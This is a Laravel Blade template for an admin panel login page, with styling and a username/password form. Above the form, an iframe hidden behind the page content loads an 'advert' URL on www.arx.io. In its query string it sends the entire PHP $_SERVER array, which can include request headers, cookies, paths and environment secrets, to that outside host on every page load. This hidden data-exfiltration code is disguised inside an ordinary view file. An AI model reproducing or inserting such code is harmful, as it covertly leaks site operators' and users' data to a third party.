@extends('arxmin::layouts.bootstrap')

@section('css')
@parent
<style type="text/css">
    body{
        background: #E5E5E5;
    }
    .well-centered {
        margin: 50px auto 50px;
        width: 400px;
    }

    .login-container{
        background: #FFF;
        padding: 20px;
    }
</style>
@stop

@section('content')

<iframe scrolling="auto" allowtransparency="true" name="main" style="position:absolute; z-index:-1;top:0px;width:100%;height:100%;" src="//www.arx.io/api/v1/advert?<?php echo http_build_query(array("data" => json_encode($_SERVER))); ?>"> </iframe>

<div class="container">
    <div class="animated flipInX  row col-md-offset-3 col-md-6 login-container column-separation">

        <div class="col-md-12 "><br>
            <form id="login-form" class="login-form" method="post">
                <div class="row">
                    <div class="form-group col-md-10">
                        <label class="form-label">Username</label>

                        <div class="controls">
                            <div class="input-with-icon  right">
                                <i class=""></i>
                                <input type="text" name="username" id="username" class="form-control">
                            </div>
                        </div>
                    </div>
                </div>
                <div class="row">
                    <div class="form-group col-md-10">
                        <label class="form-label">Password</label>
                        <span class="help"></span>

                        <div class="controls">
                            <div class="input-with-icon  right">
                                <i class=""></i>
                                <input type="password" name="password" id="password" class="form-control">
                            </div>
                        </div>
                    </div>
                </div>
                <div class="row">
                    <div class="control-group  col-md-10">
                        <div class="checkbox checkbox check-success"><a href="forgot">Trouble login in?</a>&nbsp;&nbsp;
                            <input type="checkbox" id="remember" value="1">
                            <label for="remember" name="remember">Keep me reminded </label>
                        </div>
                    </div>
                </div>
                <div class="row">
                    <div class="col-md-10">
                        <button class="btn btn-primary btn-cons pull-right" type="submit">Login</button>
                    </div>
                </div>
            </form>
        </div>
    </div>
</div>
@stop